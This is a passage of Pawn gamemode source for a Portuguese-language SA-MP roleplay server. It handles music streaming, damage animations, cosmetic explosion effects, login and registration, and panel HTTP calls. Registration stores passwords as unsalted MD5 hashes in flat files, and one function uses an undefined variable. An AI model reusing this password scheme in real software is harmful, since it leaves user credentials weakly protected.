		    if(Submission[SUBMISSION_FUNKDJ] == playerid && GetTickCount() >= FunkTickCount + TMUSIC)
		    {
		        if(left_right == KEY_LEFT)
		        {
		        	CurrentFunk = (CurrentFunk - 1) % sizeof FunkSongs;

					if(CurrentFunk == 0)
					    CurrentFunk = sizeof FunkSongs - 1;
				}
				
                if(left_right == KEY_RIGHT)
                {
                    CurrentFunk = (CurrentFunk + 1) % sizeof FunkSongs;
                    
                    if(CurrentFunk == 0)
					    CurrentFunk = 1;
				}
				
				if(!FunkTimer)
			    	FunkTimer = SetTimer("FunkDJ", 30000, false);

				StartPlayingFunkSong(CurrentFunk);
		    }
		}
	}
	
	return;
}

public OnPlayerEnterPlace(playerid, enter, int)
{
	AmbienceSound[playerid] = -1;
	
	if(Pouch[playerid] != -1 && int == INT_BANK)
	{
	    new string[128];
	    new pay;
	    
	    pay = 100 + random(201);
	    pay -= pay % 10;
	    Pay(playerid, pay);
	    Pouch[playerid] = -1;
	    DeleteTimer(ResumeTimer[playerid]);
	    format(string, sizeof string, "Malote transportado, você recebeu $%d,00 dólares.", pay);
	    SendClientMessage(playerid, COLOUR_SECURITY, string);
	}
	
	if(int == INT_DISCO)
	{
        StopAudioStreamForPlayer(playerid);
		PlayAudioStreamForPlayer(playerid, DiscoSongs[CurrentSong][songURL]);
	}
	
	if(int == INT_FUNK)
	{
        StopAudioStreamForPlayer(playerid);
		PlayAudioStreamForPlayer(playerid, FunkSongs[CurrentFunk][songURL]);
	}
}

public OnPlayerExitPlace(playerid, enter, int)
{
    AmbienceSound[playerid] = -1;
    
	if(int == INT_DISCO || int == INT_FUNK)
	    StopAudioStreamForPlayer(playerid);
}

#if USE_UCP == true

stock HTTPRequest(playerid, request)
{
	new data[128], ip[16];

	GetPlayerIp(playerid, ip, sizeof ip);

	switch(request)
	{
	    case 'c':
            format(data, sizeof data, "r=pConnect&id=%d&usr=%s&ip=%s", playerid, PlayerName(playerid), ip);
		case 'd':
			format(data, sizeof data, "r=pDisconnect&usr=%s", PlayerName(playerid));
		default:
		    return 0;
	}

	HTTP(1, HTTP_POST, "www.virtualsocietyrpg.com/UCP/admin/internal.php", data, "HTTPResponse");
	return 1;
}

stock HTTPUpdateFile(const file[])
{
	new data[128];

	format(data, sizeof data, "r=updateFile&url=%s", file);
	HTTP(1, HTTP_POST, "www.virtualsocietyrpg.com/UCP/admin/internal.php", data, "HTTPResponse");
	return 1;
}

public HTTPCheck()
{
	HTTP(HTTP_CHECK, HTTP_POST, "www.virtualsocietyrpg.com/UCP/admin/internal.php", "r=actions", "HTTPResponse");
	return 1;
}

public HTTPResponse(index, response_code, data[])
{
	if(response_code != 200) // HTTP/1.1 200 OK
	{
	    reportf("Resposta do UCP diferente de OK/200. [%d]", REPORT_UCP, response_code);
	    return -1;
	}

	if(strlen(data) == 2)
	{
		new code;

		code = strval(data);

		switch(code)
		{
	    	case UCP_ACCESS_DENIED:
  	   			report("Acesso negado ao arquivo internal.php.", REPORT_UCP);
  	   			
			case UCP_NULL_REQUEST:
		    	report("Algum dado na requesicao esta em branco.", REPORT_UCP);
		    	
			case UCP_CANT_CONNECT:
				report("Erro ao conectar o FTP/MySQL.", REPORT_UCP);
				
			case UCP_QUERY_ERROR:
		    	report("Erro ao enviar um comando ao banco de dados MySQL.", REPORT_UCP);
		    	
			case UCP_FTPGET_ERROR:
		    	report("Erro ao obter um arquivo.", REPORT_UCP);
		}
	}
	
	else if(strlen(data) > 2)
	{
	    if(index == HTTP_CHECK)
			UCPAction(data);
	}

	return 1;
}

stock UCPAction(data[])
{
	if(!strcmp(data, "&k|&b|&m", true))
	    return 1;

	new result[128];
	new index, action, plid;

	do {
		result = strtok(data, index, '|');
	    
	    if(result[0] == '&' && strlen(result) == 2)
	    {
	        action = result[1];
	        continue;
	    }
	    
	    if(action == UCP_KICK || action == UCP_BAN)
	    {
	        plid = strval(tmp);
	        
	        if(!IsPlayerConnected(plid))
				break;
	    }
	    
		switch(action)
		{
		    case UCP_KICK:
				reportf("[UCP] %s foi kickado.", REPORT_UCP, PlayerName(plid));
		    
		    case UCP_BAN:
				reportf("[UCP] %s foi banido.", REPORT_UCP, PlayerName(plid));
		}
	} while(strlen(result));
	
	return 1;
}

#endif

public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid)
{
	GetPlayerHealth(playerid, pHealth[playerid]);
	GetPlayerArmour(playerid, pArmour[playerid]);

	if(pArmour[playerid] > 0.0)
	{
	    pArmour[playerid] -= amount;
	    
		if(pArmour[playerid] < 0.0)
		{
		    pHealth[playerid] += pArmour[playerid];
		    pArmour[playerid] = 0.0;
		}
		
		if(floatcmp(pArmour[playerid] + amount, 100.0) > 0)
		{
            reportf("%s - Colete +%.2f", REPORT_ACTION, PlayerName(playerid), (pArmour[playerid] + amount) - 100);
        	pArmour[playerid] = 100.0 - amount;
			SetPlayerArmour(playerid, pArmour[playerid]);
		}
	}
	
	else
	{
		pHealth[playerid] -= amount;
	
		if(floatcmp(pHealth[playerid] + amount, 100.0) > 0)
		{
    	    reportf("%s - Vida +%.2f", REPORT_ACTION, PlayerName(playerid), (pHealth[playerid] + amount) - 100);
    	    pHealth[playerid] = 100.0 - amount;
			SetPlayerHealth(playerid, pHealth[playerid]);
		}
	}
	
	if(Limp[playerid] != 0)
	    return 0;
	
	if(pHealth[playerid] < 25.0)
	{
	    if(Limp[playerid] != 2)
	    {
	    	HideTextRed(playerid);
	    	Rob[playerid] = 0;
			Limp[playerid] = 2;
	   		ShowTextGray(playerid);
	   		SetPlayerDrunkLevel(playerid, 40000);
	   		SetTimerEx("Limping", 3000, false, "d", playerid);
		}
	}
	
	else
	{
	    ShowTextRed(playerid);

		if(amount < 10.0)
		    SetTimerEx("HideTextRed", 400, false, "d", playerid);

		else
		{
		    Rob[playerid] = 0;
		    
		    if(!IsPlayerInAnyVehicle(playerid))
		    {
		        Limp[playerid] = 1;
				SetTimerEx("StopAnimation", 200, false, "d", playerid);
		    	SetTimerEx("DamageAnimation", 500, false, "df", playerid, amount);
			}
			
			else
			    SetTimerEx("HideTextRed", 3000, false, "d", playerid);
		}
	}
	
	return 1;
}

public DamageAnimation(playerid, Float:damage)
{
	new anim;

	if(damage >= 22.0)
	{
	    new getupid;
	    
	    anim = random(4);
	    
		if(anim == 0)
		{
		    getupid = 1;
			ApplyAnimation(playerid, "PED", "KO_shot_face", 4.1, 0, 1, 1, 1, -1, 1);
		}
		
		else if(anim == 1)
		{
		    getupid = 0;
		    ApplyAnimation(playerid, "PED", "KO_shot_stom", 4.1, 0, 1, 1, 1, -1, 1);
		}
		
		else if(anim == 2)
		{
		    getupid = 0;
		    ApplyAnimation(playerid, "KNIFE", "KILL_Knife_Ped_Die", 4.1, 0, 1, 1, 1, -1, 1);
		}
		
		else
		{
		    getupid = 1;
		    ApplyAnimation(playerid, "KNIFE", "knife_hit_3", 4.1, 0, 1, 1, 1, -1, 1);
		}
		
		SetTimerEx("DamageAnimationGetUp", 7000, false, "dd", playerid, getupid);
	}
	
	else
	{
	    anim = random(3);
	    
	    if(anim == 0)
			ApplyAnimation(playerid, "MD_END", "END_SC1_PLY", 4.1, 0, 1, 1, 1, -1, 1);
			
		else if(anim == 1)
			ApplyAnimation(playerid, "MD_END", "END_SC1_RYD", 4.1, 0, 1, 1, 1, -1, 1);
			
		else
			ApplyAnimation(playerid, "MD_END", "END_SC1_SWE", 4.1, 0, 1, 1, 1, -1, 1);
        	
        SetTimerEx("DamageEnd", 5000, false, "d", playerid);
	}
	
	SetPlayerDrunkLevel(playerid, 50000);
}

public DamageAnimationGetUp(playerid, getupid)
{
	if(getupid == 0)
		ApplyAnimation(playerid, "PED", "getup_front", 4.1, 0, 1, 1, 1, -1, 1);

	else
	    ApplyAnimation(playerid, "PED", "getup", 4.1, 0, 1, 1, 1, -1, 1);
	    
	SetTimerEx("DamageEnd", 1500, false, "d", playerid);
}

public DamageEnd(playerid)
{
    Limp[playerid] = 0;
    SetPlayerDrunkLevel(playerid, pDrunk[playerid]);
    HideTextRed(playerid);
    ClearAnimations(playerid);
}

public Limping(playerid)
{
	if(Limp[playerid] == 2)
	{
		new Float:health;
		
		GetPlayerHealth(playerid, health);
	
		if(health < 25.0)
		{
		    if(!IsPlayerInAnyVehicle(playerid))
		    	ApplyAnimation(playerid, "RYDER", "RYD_Die_PT1", 4.1, 1, 1, 1, 1, 1, 1);
		    	
		    SetTimerEx("Limping", 5000, false, "d", playerid);
		    return;
		}
	}
	    
	SetPlayerDrunkLevel(playerid, pDrunk[playerid]);
	Limp[playerid] = 0;
	HideTextGray(playerid);
}

public StartDie(playerid)
{
	new int, virtual_world;
	
	int = (Dying[playerid] >> 8) & 0xFFFF;
	virtual_world = (Dying[playerid] & 0xFFFF) - 1;
	
	DeleteTimer(DieTimer[playerid]);
	DissolveTextBlack(playerid, 0xFF);
	SetPlayerInterior(playerid, int);
	SetPlayerVirtualWorld(playerid, virtual_world);
	ApplyAnimation(playerid, "SWAT", "gnstwall_injurd", 4.1, 0, 1, 1, 1, 40000, 1);
    DieTimer[playerid] = SetTimerEx("Fall", 40000, false, "dd", playerid, true);
}

public Fall(playerid, spawn)
{
	DeleteTimer(DieTimer[playerid]);
    SolveTextBlack(playerid, 0);
    HideTextLightGray(playerid);
	DieTimer[playerid] = SetTimerEx("Die", 1000, false, "dd", playerid, spawn);
}

public Die(playerid, spawn)
{
	new xpath[128];
    new hospid;
	new Float:X, Float:Y, Float:Z, Float:dis;

	xpath = GetPlayerXFilePath(playerid);
	hospid = -1;
	
	DissolveTextBlack(playerid, 0xFF);
	DeleteTimer(DieTimer[playerid]);
    ClearAnimations(playerid);
	SetCameraBehindPlayer(playerid);
	SetPlayerSysHealth(playerid, 100.0);
	GetPlayerWorldPos(playerid, X, Y, Z);
	
	for(new h = 0; h < sizeof Areas; h++)
	{
	    if(Areas[h][areaId] == AREA_HOSPITAL)
	    {
	        new Float:pdis;

			pdis = GetDistance(X, Y, Z, Areas[h][areaX], Areas[h][areaY], Areas[h][areaZ]);

			if(pdis < dis || hospid == -1)
   			{
      			dis = pdis;
         		hospid = h;
	        }
   		}
	}

	if(hospid != -1)
 		SetSpawnInfo(playerid, 0, hGetInt(xpath, "Skin"), Areas[hospid][areaX], Areas[hospid][areaY], Areas[hospid][areaZ], 180.0, 0, 0, 0, 0, 0, 0);
 		
	if(spawn)
		SpawnPlayer(playerid);
		
    Dying[playerid] = 0;
}

public Saving(playerid, plid)
{
    Dying[plid] = 0;
    ClearAnimations(playerid);
	HideTextLightGray(plid);
	SetCameraBehindPlayer(plid);
	SetPlayerDrunkLevel(plid, pDrunk[plid]);
	SetPlayerSysHealth(plid, 50.0);
	ApplyAnimation(plid, "PED", "getup", 4.1, 0, 1, 1, 1, -1, 1);
	TextDrawHideForPlayer(plid, tdblack);
	DeleteTimer(DieTimer[plid]);
	Pay(playerid, 500);
	SetTimerEx("StopAnimation", 1500, false, "d", plid);
}

public StartPlayingDiscoSong(songid)
{
	new song, tckcnt;
	
	tckcnt = GetTickCount();
	
	if(tckcnt < DiscoTickCount + TMUSIC)
	{
	    DeleteTimer(DiscoMusicTimer);
		DiscoMusicTimer = SetTimerEx("StartPlayingDiscoSong", (DiscoTickCount + TMUSIC) - tckcnt, false, "d", songid);
	    return -1;
	}
	
	song = songid;
	DiscoTickCount = tckcnt;
	
	if(song < 0 || song >= sizeof DiscoSongs)
	{
	    do
	    	song = random(sizeof DiscoSongs);
		while((song == CurrentSong && sizeof DiscoSongs > 1));
	}
	
	for(new n = 0; n < MAX_SLOTS; n++)
	{
	    if(IsPlayerConnected(n) && IsPlayerLogged(n) && GetPlayerInt(n) == INT_DISCO)
	    {
			StopAudioStreamForPlayer(n);
			PlayAudioStreamForPlayer(n, DiscoSongs[song][songURL]);
	    }
	}
	
	if(Submission[SUBMISSION_DJ] != INVALID_PLAYER_ID)
	{
		new string[256];
		format(string, sizeof string, "Tocando agora: %s <> Gênero: %s", DiscoSongs[song][songName], DiscoSongs[song][songGenre]);
		SendClientMessage(Submission[SUBMISSION_DJ], COLOUR_DJ, string);
	}
	
	CurrentSong = song;
	DiscoTickCount = GetTickCount();
	DeleteTimer(DiscoMusicTimer);
	DiscoMusicTimer = SetTimerEx("StartPlayingDiscoSong", DiscoSongs[song][songTime] * 1000, false, "d", -1);
	return 0;
}

public StartPlayingFunkSong(songid)
{
    new song, tckcnt;

	tckcnt = GetTickCount();

	if(tckcnt < FunkTickCount + TMUSIC)
	{
	    DeleteTimer(FunkMusicTimer);
		FunkMusicTimer = SetTimerEx("StartPlayingFunkSong", (FunkTickCount + TMUSIC) - tckcnt, false, "d", songid);
	    return -1;
	}

	song = songid;
    FunkTickCount = tckcnt;
    
	if(song < 0 || song >= sizeof FunkSongs)
	{
	    do
	    	song = random(sizeof FunkSongs - 1) + 1;
		while((song == CurrentFunk && sizeof FunkSongs > 1));
	}

	for(new n = 0; n < MAX_SLOTS; n++)
	{
	    if(IsPlayerConnected(n) && IsPlayerLogged(n) && GetPlayerInt(n) == INT_FUNK)
	    {
			StopAudioStreamForPlayer(n);
			PlayAudioStreamForPlayer(n, FunkSongs[song][songURL]);
	    }
	}

	if(Submission[SUBMISSION_FUNKDJ] != INVALID_PLAYER_ID)
	{
		new string[256];
		format(string, sizeof string, "Tocando agora: %s <> Gênero: %s", FunkSongs[song][songName], FunkSongs[song][songGenre]);
		SendClientMessage(Submission[SUBMISSION_FUNKDJ], COLOUR_DJ, string);
	}

	CurrentFunk = song;
	FunkTickCount = GetTickCount();
	DeleteTimer(FunkMusicTimer);
	FunkMusicTimer = SetTimerEx("StartPlayingFunkSong", FunkSongs[song][songTime] * 1000, false, "d", -1);
	return 0;
}

public RestartDance(playerid)
{
    switch(DanceStyle[playerid])
    {
    	case 0:
     		ApplyAnimation(playerid, "DANCING", "dnce_M_d", 4.1, 1, 1, 1, 1, -1, 1);

		case 1:
			ApplyAnimation(playerid, "DANCING", "dance_loop", 4.1, 1, 1, 1, 1, -1, 1);

		case 2:
			ApplyAnimation(playerid, "DANCING", "dnce_M_a", 4.1, 1, 1, 1, 1, -1, 1);

		case 3:
  			ApplyAnimation(playerid, "DANCING", "dnce_M_b", 4.1, 1, 1, 1, 1, -1, 1);

		case 4:
  			ApplyAnimation(playerid, "DANCING", "dnce_M_c", 4.1, 1, 1, 1, 1, -1, 1);

		case 5:
  			ApplyAnimation(playerid, "DANCING", "dnce_M_e", 4.1, 1, 1, 1, 1, -1, 1);

		case 6:
  			ApplyAnimation(playerid, "DANCING", "DAN_Loop_A", 4.1, 1, 1, 1, 1, -1, 1);
  	}

	KeyEvent[playerid] |= KEY_EVENT_DANCING;
}

public RestartStripTease(playerid)
{
    ApplyAnimation(playerid, "STRIP", "STR_Loop_A", 4.1, 1, 1, 1, 1, -1, 1);
	KeyEvent[playerid] |= KEY_EVENT_STRIPPING;
}

public CreateExplosionT(Float:X, Float:Y, Float:Z, type, Float:radius)
	CreateExplosion(X, Y, Z, type, radius);

public ExplodeBomb(objectid, Float:X, Float:Y, Float:Z)
{
	new Float:DX, Float:DY, Float:DZ, Float:DA, Float:D;
	    
	DestroyObject(objectid);
	
	for(new n = 0; n < MAX_SLOTS; n++)
	{
	    if(IsPlayerConnected(n) && IsPlayerLogged(n))
	    {
	        if(GetPlayerState(n) == PLAYER_STATE_ONFOOT)
	        {
	            GetPlayerPos(n, DX, DY, DZ);
	            D = GetDistance(DX, DY, DZ, X, Y, Z);
	            
	            if(D < ERADIUS)
	            {
	                DA = 180.0 - atan2(X - DX, Y - DY);
	                DX = (ERADIUS - D) * floatsin(-DA, degrees);
	            	DY = (ERADIUS - D) * floatcos(-DA, degrees);
	            	DZ = ERADIUS - D;
	                SetPlayerVelocity(n, DX * 0.125, DY * 0.125, DZ);
				}
	        }
	        
	        else if(IsPlayerInAnyVehicle(n))
	        {
         		new vid;
	                
         		vid = GetPlayerVehicleID(n);
           		GetVehiclePos(vid, DX, DY, DZ);
 				D = GetDistance(DX, DY, DZ, X, Y, Z);
	    
     			if(D < ERADIUS)
     			{
        			DX -= X;
				    DY -= Y;

					if(DX < 0.0)
     					DX = -ERADIUS - DX;

					else
	    				DX = ERADIUS - DX;

					if(DY < 0.0)
					    DY = -ERADIUS - DY;

					else
					    DY = ERADIUS - DY;

					DZ = ERADIUS - D;
				    DA = atan2(DX, DY);
		    		SetVehicleVelocity(vid, DX * 0.01, DY * 0.01, DZ * (0.1 / ERADIUS));
		    		SetVehicleAngularVelocity(vid, DX * (0.005 / ERADIUS), DY * (0.005 / ERADIUS), DA * (0.001 / ERADIUS));
				}
	        }
	    }
	}
	
	for(new v = 0; v < GetVehicles(); v++)
	{
	    for(new n = 0; n < MAX_SLOTS; n++)
	    {
	        if(IsPlayerConnected(n) && IsPlayerLogged(n) && IsPlayerInVehicle(n, v))
	            continue;
	    }
	    
	    GetVehiclePos(v, DX, DY, DZ);
		D = GetDistance(DX, DY, DZ, X, Y, Z);
		
		if(D < ERADIUS)
		    SetVehicleHealth(v, 0.0);
	}
	
	CreateExplosion(X, Y, Z, 7, 100.0);
	CreateExplosion(X, Y, Z + 6.0, 7, 100.0);
	CreateExplosion(X + 5.0, Y, Z, 7, 100.0);
	CreateExplosion(X, Y + 5.0, Z + 6.0, 7, 100.0);
	CreateExplosion(X - 5.0, Y, Z, 7, 100.0);
	CreateExplosion(X, Y - 5.0, Z + 6.0, 7, 100.0);
	SetTimerEx("CreateExplosionT", 400,  false, "fffdf", X + random(11) - 5.0, Y + random(5) - 5.0, Z + random(5), 6, 100.0);
	SetTimerEx("CreateExplosionT", 410,  false, "fffdf", X + random(11) - 5.0, Y + random(5) - 5.0, Z + random(5), 6, 100.0);
	SetTimerEx("CreateExplosionT", 420,  false, "fffdf", X + random(11) - 5.0, Y + random(5) - 5.0, Z + random(5), 6, 100.0);
	SetTimerEx("CreateExplosionT", 430,  false, "fffdf", X + random(11) - 5.0, Y + random(5) - 5.0, Z + random(5), 6, 100.0);
	SetTimerEx("CreateExplosionT", 800,  false, "fffdf", X + random(17) - 8.0, Y + random(17) - 8.0, Z + random(8), 6, 100.0);
	SetTimerEx("CreateExplosionT", 810,  false, "fffdf", X + random(17) - 8.0, Y + random(17) - 8.0, Z + random(8), 6, 100.0);
	SetTimerEx("CreateExplosionT", 820,  false, "fffdf", X + random(17) - 8.0, Y + random(17) - 8.0, Z + random(8), 6, 100.0);
	SetTimerEx("CreateExplosionT", 830,  false, "fffdf", X + random(17) - 8.0, Y + random(17) - 8.0, Z + random(8), 6, 100.0);
	SetTimerEx("CreateExplosionT", 1220, false, "fffdf", X + random(21) - 10.0, Y + random(21) - 10.0, Z + random(10), 6, 100.0);
	SetTimerEx("CreateExplosionT", 1240, false, "fffdf", X + random(21) - 10.0, Y + random(21) - 10.0, Z + random(10), 6, 100.0);
	SetTimerEx("CreateExplosionT", 1620, false, "fffdf", X + random(21) - 10.0, Y + random(21) - 10.0, Z + random(10), 6, 100.0);
	SetTimerEx("CreateExplosionT", 1640, false, "fffdf", X + random(21) - 10.0, Y + random(21) - 10.0, Z + random(10), 6, 100.0);
}

public ExplodeApproxBomb(objectid, Float:X, Float:Y, Float:Z, count)
{
	new bool:explode;
	
	explode = true;
	
	if(count < 150)
	{
	    explode = false;
	    
    	for(new n = 0; n < MAX_SLOTS; n++)
    	{
    	    if(IsPlayerConnected(n) && IsPlayerLogged(n))
    	    {
    	        new Float:PX, Float:PY, Float:PZ;

	            GetPlayerPos(n, PX, PY, PZ);

				if(GetDistance(PX, PY, PZ, X, Y, Z) < 12.0)
				{
				    explode = true;
				    break;
				}
	        }
	    }
	}
    
    if(explode)
    {
        ExplodeBomb(objectid, X, Y, Z);
		return;
	}
	
	SetTimerEx("ExplodeApproxBomb", 1025, false, "dfffd", objectid, X, Y, Z, count+1);
}

public GasEffect(objectid, Float:X, Float:Y, Float:Z)
{
	new id;

    DestroyObject(objectid);
    
    id = CreateObject(2780, X, Y, Z - 1.7, 0.0, 0.0, 0.0);
    SetTimerEx("TakeObject", 20000, false, "d", id);
    id = CreateObject(2780, X, Y + 5.0, Z - 1.7, 0.0, 0.0, 0.0);
    SetTimerEx("TakeObject", 15100, false, "d", id);
    id = CreateObject(2780, X + 5.0, Y, Z - 1.7, 0.0, 0.0, 0.0);
    SetTimerEx("TakeObject", 15200, false, "d", id);
    id = CreateObject(2780, X, Y - 5.0, Z - 1.7, 0.0, 0.0, 0.0);
    SetTimerEx("TakeObject", 15300, false, "d", id);
    id = CreateObject(2780, X - 5.0, Y, Z - 1.7, 0.0, 0.0, 0.0);
    SetTimerEx("TakeObject", 15400, false, "d", id);
}

public FlashEffect(objectid, Float:X, Float:Y, Float:Z)
{
    DestroyObject(objectid);
    
	for(new n = 0; n < MAX_SLOTS; n++)
	{
	    if(IsPlayerConnected(n) && IsPlayerLogged(n) && GetPlayerSkin(n) != 285)
	    {
	        new time;
	        new Float:PX, Float:PY, Float:PZ, Float:PA, Float:dis, Float:lookatdis;
	        
	        GetPlayerPos(n, PX, PY, PZ);
	        GetPlayerFacingAngle(n, PA);
	        dis = GetDistance(PX, PY, PZ, X, Y, Z);
	        PX += 0.1 * floatsin(-PA, degrees);
	        PY += 0.1 * floatcos(-PA, degrees);
	        lookatdis = GetDistance(PX, PY, PZ, X, Y, Z);
	                            
			if(dis < 120.0 && dis > lookatdis)
			{
			    time = floatround(((dis - lookatdis) * 10.0) + (120.0 - dis) / 15.0) * 1000;
			    TextDrawColour(tdwhite, 0xFFFFFFFF);
			    TextDrawShowForPlayer(n, tdwhite);
			    SetTimerEx("DissolveTextWhite", time, false, "dd", n, 0xFF);
			}
	    }
	}
}

public RocketEffect(objectid, Float:X, Float:Y, Float:Z, stage)
{
	if(stage == 0)
	{
	    SetTimerEx("CreateExplosionT", 350, false, "fffdf", X, Y, Z + 25.0, 11, 0.0);
	    SetTimerEx("CreateExplosionT", 600, false, "fffdf", X, Y, Z + 50.0, 11, 0.0);
	    SetTimerEx("CreateExplosionT", 850, false, "fffdf", X, Y, Z + 75.0, 11, 0.0);
	    Z += 100.0;
	    MoveObject(objectid, X, Y, Z, 100.0);
	}
	
	else if(stage == 1 || stage == 2 || stage == 3 || stage == 4)
	{
	    new id, time;
	    new Float:RX, Float:RY, Float:RZ;
		
	    for(new rockets = 0; rockets < 6; rockets++)
	    {
	        RX = random(51) - 25.0;
	        RY = random(51) - 25.0;
	        RZ = random(51);
	        
	        id = CreateObject(354, X, Y, Z, 0.0, 0.0, 0.0);
	        time = floatround((mod(RX) + mod(RY) + RZ) / 40.0) * 1000;
	        
	        RX += X;
	        RY += Y;
	        RZ = Z - RZ;
	        
	        MoveObject(id, RX, RY, RZ, 40.0);
	        SetTimerEx("TakeObject", time, false, "d", id);
	        SetTimerEx("CreateExplosionT", time + 50, false, "fffdf", RX, RY, RZ, 11, 0.0);
	    }
	    
	    Z -= 10.0;
	    CreateExplosion(X, Y, Z + 20.0, 11, 0.0);
	    MoveObject(objectid, X, Y, Z, 10.0);
	}
	
	else if(stage == 5)
	    DestroyObject(objectid);

	if(stage < 5)
    	SetTimerEx("RocketEffect", 1000, false, "dfffd", objectid, X, Y, Z, stage + 1);
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	if(dialogid == DIALOG_REGISTER_LOGIN)
	{
	    new xpath[128], kpath[128], md5[33];
	    
	    if(!response)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Solicitação de registro/login cancelada, você foi kickado do servidor!");
	        SpawnPlayer(playerid);
	        StopAudioStreamForPlayer(playerid);
	        Kick(playerid);
	        return 0;
	    }
	    
	    if(IsPlayerLogged(playerid))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você já está autenticado.");
			return 0;
	    }
	    
	    if(!strlen(inputtext))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Digite uma senha...");
		    ShowLoginDialog(playerid);
			return 0;
	    }

		xpath = GetPlayerXFilePath(playerid);
		kpath = GetPlayerKFilePath(playerid);
		md5 = MD5_Hash(inputtext);
		
	    if(!fexist(xpath) || !fexist(kpath))
	    {
	        new File:acc;
	        
	        acc = fopen(ACCOUNTS_FILE_PATH, io_append);
	        fwrite(acc, PlayerName(playerid));
	        fwrite(acc, "\r\n");
	        fclose(acc);
	        
	        hSetString(xpath, "Password", md5);
	        hSetInt(xpath, "Job", JOB_UNEMPLOYED);
	        hSetInt(xpath, "Level", 0);
	        hSetInt(xpath, "Xpoints", 0);
	        hSetInt(xpath, "House", -1);
	        hSetInt(xpath, "Hab", 0);
			hSetInt(xpath, "Bank", 1000);
			hSetInt(xpath, "Money", 0);
			hSetInt(xpath, "Skin", 101);
			hSetInt(xpath, "Accessories", 0);
			hSetInt(xpath, "Itens", 0);
			hSetInt(xpath, "Drunk", 0);
			hSetInt(xpath, "Fine", 0);
			hSetInt(xpath, "WantedLevel", 0);
			hSetInt(xpath, "BustedStart", 0);
			hSetInt(xpath, "BustedTime", 0);
			hSetInt(xpath, "Bail", 0);
			hSetInt(xpath, "Handgun", 0);
			hSetInt(xpath, "Lightgun", 0);
			hSetInt(xpath, "LicenseGun", 0);
			hSetInt(xpath, "Steel", 0);
			hSetInt(xpath, "Gallon", 0);
			hSetInt(xpath, "Hotel", 0);
			hSetInt(xpath, "Credits", 0);
			hSetInt(xpath, "Toys", 0);
			hSetInt(xpath, "Battery", 0);
			hSetInt(xpath, "Bait", 0);
			hSetInt(xpath, "Fish", 0);
			hSetInt(xpath, "FishingSkill", 0);
			hSetInt(xpath, "Moderator", 0);
			hSetFloat(xpath, "Health", 100.0);
			hSetFloat(xpath, "Armour", 0.0);
			
			for(new cnt = 0; cnt < sizeof Counters; cnt++)
			    SetPlayerCounter(playerid, cnt, 0);
			
			for(new skill = 0; skill < 11; skill++)
			{
			    new skill_key[128];
	    		format(skill_key, sizeof skill_key, "SkillLevel%d", skill);
				hSetInt(kpath, skill_key, 0);
				SetPlayerSkillLevel(playerid, skill, 0);
			}
			
			SavePlayerPos(playerid, 1686.0055, -2239.6494, 13.5469, 176.8181);
			SetSpawnInfo(playerid, 0, 101, -1983.3894, 152.8307, 27.6875, 86.9105, 0, 0, 0, 0, 0, 0);
			GivePlayerSysMoney(playerid, 200);

			for(new w = 0; w < 5; w++)
			    pWeapons[playerid][w] = 0;
			
			
		
			IntroductionPart[playerid] = 1;
			StopAudioStreamForPlayer(playerid);
			PlayAudioStreamForPlayer(playerid, "http://dc389.4shared.com/img/1071481095/183d6202/dlink__2Fdownload_2Fjm-3HkGy_3Ftsid_3D20120110-180909-a3abdab9/preview.mp3");

			for(new ln = 0; ln < NLINES; ln++)
				SendClientMessage(playerid, COLOUR_WHITE, " ");
				
			TextDrawShowForPlayer(playerid, tdblack);
			SetTimerEx("Introducing", 1000, false, "d", playerid);
	    }
	    
	    else
	    {
	        new handgun, lightgun;
	        
	        if(strcmp(md5, hGetString(xpath, "Password"), false) != 0)
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Senha incorreta!");
	            ShowLoginDialog(playerid);
	            return 0;
	        }
	        
	        for(new ln = 0; ln < NLINES; ln++)
				SendClientMessage(playerid, COLOUR_WHITE, " ");
				
            for(new skill = 0; skill < 11; skill++)
			{
			    new skill_key[128];
	    		format(skill_key, sizeof skill_key, "SkillLevel%d", skill);
				SetPlayerSkillLevel(playerid, skill, hGetInt(kpath, skill_key));
			}
			
			handgun = hGetInt(xpath, "Handgun");
			lightgun = hGetInt(xpath, "Lightgun");
			pMoney[playerid] = hGetInt(xpath, "Money");
			pWeapons[playerid][0] = handgun & 0x3F;
			pWeapons[playerid][1] = handgun >> 6;
	        pWeapons[playerid][2] = lightgun & 0x3F;
			pWeapons[playerid][3] = lightgun >> 6;
			pWeapons[playerid][4] = hGetInt(xpath, "Steel");
			pDrunk[playerid] = hGetInt(xpath, "Drunk");
			pHealth[playerid] = hGetInt(xpath, "Health");
			pArmour[playerid] = hGetInt(xpath, "Armour");
			
			SetPlayerHealth(playerid, pHealth[playerid]);
			SetPlayerArmour(playerid, pArmour[playerid]);
			
			if(hGetInt(xpath, "BustedTime") > 0)
			    SetSpawnInfo(playerid, 0, hGetInt(xpath, "Skin"), 262.8808, 76.1974, 1001.0390, float(random(360)), 0, 0, 0, 0, 0, 0);
			    
			else
				UpdatePlayerSpawn(playerid);
				
            StopAudioStreamForPlayer(playerid);
			SendClientMessage(playerid, COLOUR_GREEN, "Você foi autenticado com sucesso.");
	    }
	    
	    SpawnPlayer(playerid);
	    return 1;
 	}
 	
 	if(dialogid == DIALOG_INVITE)
 	{
 	    new string[128];
		        
 	    if(response)
 	    {
 	        if(Invite[playerid] == INVITE_GANG)
 	    	{
 	    	    SendClientMessage(playerid, COLOUR_SKY_BLUE, "Você aceitou fazer parte da gangue.");
                format(string, sizeof string, "%s aceitou fazer parte da sua gangue.", PlayerName(playerid));
				SendClientMessage(InviteSender[playerid], COLOUR_SKY_BLUE, string);
				PutPlayerInGang(playerid, InviteParams[playerid], GANG_POST_SOLDIER);
 	    	}
 	    	
 	    	else if(Invite[playerid] == INVITE_REPAIR)
 	    	{
 	    	    new pay, vehid;
 	    	    
 	    	    pay = InviteParams[playerid] >> 16;
 	    	    vehid = InviteParams[playerid] & 0xFFFF;
 	    	    
 	    	    if(GetPlayerSysMoney(playerid) < pay)
	 	    	    DrawTextForPlayer(playerid, "Dinheiro insuficiente.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
				    
				else
				{
				    new Text:tdrepair;
				    
 	    	    	tdrepair = TextDrawCreate(21.0, 125.0, "_");
					TextDrawAlignment(tdrepair, 0);
					TextDrawFont(tdrepair, 1);
					TextDrawLetterSize(tdrepair, 0.5, 1.5);
